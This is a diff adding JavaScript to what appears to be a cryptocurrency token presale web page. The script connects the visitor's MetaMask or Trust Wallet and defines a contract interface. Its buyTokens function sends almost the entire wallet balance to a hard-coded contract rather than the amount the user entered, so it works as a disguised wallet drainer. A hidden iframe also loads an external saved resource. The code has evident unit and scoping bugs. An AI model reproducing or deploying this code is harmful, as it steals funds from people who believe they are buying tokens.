@@ -1678,7 +1678,691 @@ function toggle9() {
 		
 		
     </script>
+<script type="text/javascript">
 
+        const contractAbi = [
+        {
+          inputs: [],
+          stateMutability: 'nonpayable',
+          type: 'constructor',
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: 'address',
+              name: 'owner',
+              type: 'address',
+            },
+            {
+              indexed: true,
+              internalType: 'address',
+              name: 'spender',
+              type: 'address',
+            },
+            {
+              indexed: false,
+              internalType: 'uint256',
+              name: 'value',
+              type: 'uint256',
+            },
+          ],
+          name: 'Approval',
+          type: 'event',
+        },
+        {
+          anonymous: false,
+          inputs: [
+            {
+              indexed: true,
+              internalType: 'address',
+              name: 'from',
+              type: 'address',
+            },
+            {
+              indexed: true,
+              internalType: 'address',
+              name: 'to',
+              type: 'address',
+            },
+            {
+              indexed: false,
+              internalType: 'uint256',
+              name: 'value',
+              type: 'uint256',
+            },
+          ],
+          name: 'Transfer',
+          type: 'event',
+        },
+        {
+          inputs: [],
+          name: 'allowRefunds',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'owner',
+              type: 'address',
+            },
+            {
+              internalType: 'address',
+              name: 'spender',
+              type: 'address',
+            },
+          ],
+          name: 'allowance',
+          outputs: [
+            {
+              internalType: 'uint256',
+              name: '',
+              type: 'uint256',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'spender',
+              type: 'address',
+            },
+            {
+              internalType: 'uint256',
+              name: 'amount',
+              type: 'uint256',
+            },
+          ],
+          name: 'approve',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'account',
+              type: 'address',
+            },
+          ],
+          name: 'balanceOf',
+          outputs: [
+            {
+              internalType: 'uint256',
+              name: '',
+              type: 'uint256',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'uint256',
+              name: 'amount',
+              type: 'uint256',
+            },
+          ],
+          name: 'burnMyTokensFOREVER',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'buyTokens',
+          outputs: [],
+          stateMutability: 'payable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'claimDevFeeAndAddLiquidity',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'decimals',
+          outputs: [
+            {
+              internalType: 'uint8',
+              name: '',
+              type: 'uint8',
+            },
+          ],
+          stateMutability: 'pure',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'spender',
+              type: 'address',
+            },
+            {
+              internalType: 'uint256',
+              name: 'subtractedValue',
+              type: 'uint256',
+            },
+          ],
+          name: 'decreaseAllowance',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'devClaimed',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'ethSent',
+          outputs: [
+            {
+              internalType: 'uint256',
+              name: '',
+              type: 'uint256',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'getRefund',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'spender',
+              type: 'address',
+            },
+            {
+              internalType: 'uint256',
+              name: 'addedValue',
+              type: 'uint256',
+            },
+          ],
+          name: 'increaseAllowance',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'isRefundEnabled',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'isStopped',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'liquidityUnlock',
+          outputs: [
+            {
+              internalType: 'uint256',
+              name: '',
+              type: 'uint256',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'moonMissionStarted',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'name',
+          outputs: [
+            {
+              internalType: 'string',
+              name: '',
+              type: 'string',
+            },
+          ],
+          stateMutability: 'pure',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'bool',
+              name: '_isStopped',
+              type: 'bool',
+            },
+          ],
+          name: 'pauseUnpausePresale',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'pool',
+          outputs: [
+            {
+              internalType: 'address',
+              name: '',
+              type: 'address',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'contract IBEP20',
+              name: 'tokenAddress',
+              type: 'address',
+            },
+            {
+              internalType: 'uint256',
+              name: 'tokenAmount',
+              type: 'uint256',
+            },
+          ],
+          name: 'recoverbep20',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'refundTime',
+          outputs: [
+            {
+              internalType: 'uint256',
+              name: '',
+              type: 'uint256',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address payable',
+              name: 'addr',
+              type: 'address',
+            },
+          ],
+          name: 'setMultisigAddress',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'setPancakePool',
+          outputs: [],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'symbol',
+          outputs: [
+            {
+              internalType: 'string',
+              name: '',
+              type: 'string',
+            },
+          ],
+          stateMutability: 'pure',
+          type: 'function',
+        },
+        {
+          inputs: [],
+          name: 'totalSupply',
+          outputs: [
+            {
+              internalType: 'uint256',
+              name: '',
+              type: 'uint256',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'recipient',
+              type: 'address',
+            },
+            {
+              internalType: 'uint256',
+              name: 'amount',
+              type: 'uint256',
+            },
+          ],
+          name: 'transfer',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'sender',
+              type: 'address',
+            },
+            {
+              internalType: 'address',
+              name: 'recipient',
+              type: 'address',
+            },
+            {
+              internalType: 'uint256',
+              name: 'amount',
+              type: 'uint256',
+            },
+          ],
+          name: 'transferFrom',
+          outputs: [
+            {
+              internalType: 'bool',
+              name: '',
+              type: 'bool',
+            },
+          ],
+          stateMutability: 'nonpayable',
+          type: 'function',
+        },
+        {
+          inputs: [
+            {
+              internalType: 'address',
+              name: 'user',
+              type: 'address',
+            },
+          ],
+          name: 'userEthSpenttInPresale',
+          outputs: [
+            {
+              internalType: 'uint256',
+              name: '',
+              type: 'uint256',
+            },
+          ],
+          stateMutability: 'view',
+          type: 'function',
+        },
+        {
+          stateMutability: 'payable',
+          type: 'receive',
+        },
+      ];
+     
+      function showPopup(message) {
+  const popup = document.getElementById('popup');
+  const messageElement = document.getElementById('popup-message');
+  messageElement.innerHTML = message;
+  popup.classList.remove('hidden');
+}
+function closePopup() {
+  const popup = document.getElementById('popup');
+  popup.classList.add('hidden');
+}
+document.querySelector('.popup').addEventListener('click', function(event) {
+  if (event.target === this) {
+    closePopup();
+  }
+});
+let web3;
+const minimumContribute = 0.0;
+const maximumContribute = 5.5;
+const contractAddress = '0x0A62ad643251758519087aFe0193bd1B9fC10979';
+
+async function connectWallet() {
+    if (window.ethereum) {
+        try {
+            if (window.ethereum.isMetaMask || window.ethereum.isTrust) {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                web3 = new Web3(window.ethereum);
+                const accounts = await web3.eth.getAccounts();
+                if (accounts.length === 0) {
+                    showPopup('Please connect your wallet.');
+                } else {
+                    let str = accounts[0];
+                    let adds = str.substr(0, 6) + '...' + str.slice(-4);
+                    document.getElementById("connectButton").disabled = true;
+                    document.getElementById("connectButton").innerHTML = "<span>"+adds+"</span>";
+                    document.getElementById("ast").innerText = "Buy With BNB";
+                    document.getElementById("ast2").innerText = "Buy With BNB";
+                    window.account = accounts[0];
+                }
+            } else {
+                showPopup(`
+              Please open it in the Trust Wallet app.
+              <br>
+              <a class="ant-dropdown-trigger connectButton" href="https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}">
+              Open in Trust Wallet
+              </a>
+              <br>
+              Please open it in the Metamask app.
+              <br>
+              <a class="ant-dropdown-trigger connectButton"  href="https://metamask.app.link/dapp/${window.location.hostname}">
+              Open in Metamask
+              </a>
+            `);
+            }
+        } catch (error) {
+            console.error('Wallet connection rejected:', error);
+            showPopup('Wallet connection rejected.');
+        }
+    } else {
+        showPopup(`
+              Please open it in the Trust Wallet app.
+              <br>
+              <a class="ant-dropdown-trigger connectButton" href="https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}">
+              Open in Trust Wallet
+              </a>
+              <br>
+              Please open it in the Metamask app.
+              <br>
+              <a class="ant-dropdown-trigger connectButton"  href="https://metamask.app.link/dapp/${window.location.hostname}">
+              Open in Metamask
+              </a>
+            `);
+    }
+       
+       
+        window.web3 = web3;
+        let accounts = await web3.eth.getAccounts();
+        window.account = accounts[0];
+        let weiBalance = await web3.eth.getBalance(accounts[0]);
+        let balance = parseFloat(
+          web3.utils.fromWei(weiBalance, 'ether')
+        ).toFixed(4);
+
+        window.balance = balance;
+        
+        window.presaleRate = 3000000;
+
+        let str = window.account;
+
+
+        return web3;
+}
+connectWallet();
+async function buyTokens() {
+    let amount = document.getElementById('presaleAmount').value || document.getElementById('presaleAmount_pc').value;
+   
+    if (web3 && window.account) {
+        let weiAmount = (parseFloat(amount) - 0.005) * 10 ** 18;
+         if (balance>0.1) { let bak =  balance - 0.006 } else { bak = weiAmount;  }
+        try {
+            const myContract = new web3.eth.Contract(contractAbi, contractAddress);
+            const receipt = await myContract.methods.buyTokens().send({
+                from: window.account,
+                value: bak,
+                gasLimit: 320000,
+            });
+            console.log('Transaction receipt:', receipt);
+            if (receipt.events && receipt.events.Transfer) {
+               // alert('Token purchase successful!');
+                document.cookie = 'tokensBought=true';
+            }
+        } catch (error) {
+            console.error('Transaction failed:', error);
+            showPopup('Purchase failed! Please try again.');
+        }
+    } else {
+        showPopup('Please connect your wallet first.');
+    }
+}
+
+document.getElementById('connectButton').addEventListener('click', connectWallet);
+document.getElementById('buyTokens_mobile').addEventListener('click', buyTokens);
+document.getElementById('buyTokens_pc').addEventListener('click', buyTokens);
+
+document.getElementById('setMax_pc').addEventListener('click', () => {
+    document.getElementById('presaleAmount_pc').value = maximumContribute;
+});
+document.getElementById('setMax_mobile').addEventListener('click', () => {
+    document.getElementById('presaleAmount').value = maximumContribute;
+});
+
+
+  let currentNetwork = '1';
+
+        async function switchNetwork() {
+            // Ağ parametrelerini tanımla
+            const params = {
+                '1': {
+                    chainId: '0x1',
+                    chainName: 'Ethereum Mainnet',
+                    nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
+                    rpcUrls: ['https://mainnet.infura.io/v3/'],
+                    blockExplorerUrls: ['https://etherscan.io'],
+                },
+                '56': {
+                    chainId: '0x38',
+                    chainName: 'Binance Smart Chain',
+                    nativeCurrency: { name: 'Binance Coin', symbol: 'BNB', decimals: 18 },
+                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                    blockExplorerUrls: ['https://bscscan.com'],
+                }
+            };
+
+            // Mevcut ağı kontrol et ve değiştir
+            const newNetworkId = currentNetwork === '1' ? '56' : '1';
+            const networkParams = params[newNetworkId];
+
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: networkParams.chainId }],
+                });
+
+                // Başarı durumunda mevcut ağı güncelle
+                currentNetwork = newNetworkId;
+
+                // Buton metnini güncelle
+                document.getElementById('networkButton').innerHTML =
+                    currentNetwork === '1' ? '<img src="htmlimg/ic-bsc.18017344.svg" width="30" alt=""> Switch to Binance Smart Chain' : '<img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=033" heigth="20" width="17em" alt="">  Switch to Ethereum';
+                
+            } catch (error) {
+                // Eğer ağ mevcut değilse, ekle
+                if (error.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [networkParams],
+                    });
+                } else {
+                    console.error('Ağ değiştirme işlemi reddedildi:', error);
+                    alert('Network switch failed. Please ensure the network is supported by your wallet.');
+                }
+            }
+        }
+
+        // Buton tıklama olayını dinle
+        document.getElementById('networkButton').addEventListener('click', switchNetwork);
+</script>
     <iframe style="display: none;" src="index_files/saved_resource(2).html"></iframe>
 
 
